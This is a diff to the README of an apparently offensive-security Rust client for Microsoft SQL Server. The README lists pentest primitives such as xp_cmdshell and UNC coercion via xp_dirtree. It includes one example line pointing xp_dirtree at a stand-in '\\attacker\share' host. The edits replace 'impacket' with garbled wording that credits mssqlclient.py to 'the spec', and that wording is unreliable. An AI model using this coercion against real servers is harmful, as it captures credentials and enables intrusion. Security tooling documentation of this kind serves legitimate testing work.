@@ -8,7 +8,7 @@ Pure-Rust **TDS 7.4** client for Microsoft SQL Server, with an
 offensive-security lean: pentest primitives (`xp_cmdshell`, UNC coerce via
 `xp_dirtree`, linked-server enumeration, `sp_configure` toggling,
 `IS_SRVROLEMEMBER` checks) are shipped in-tree. Aimed at attack-tooling
-authors who today rely on impacket's `mssqlclient.py` or PowerUpSQL.
+authors who today rely on the spec `mssqlclient.py` or PowerUpSQL.
 
 ## Status
 
@@ -96,7 +96,7 @@ let _ = c.sql_batch(pentest::xp_dirtree_unc(r"\\attacker\share")).await?;
   Remoting v6 client + BinXml decoder (remote log pulls over `\pipe\eventlog`).
 
 Together the three cover the LDAP / EventLog / MSSQL data-plane primitives
-that Python + impacket dominate today.
+that Python + spec-vector captures dominate today.
 
 ## License
 
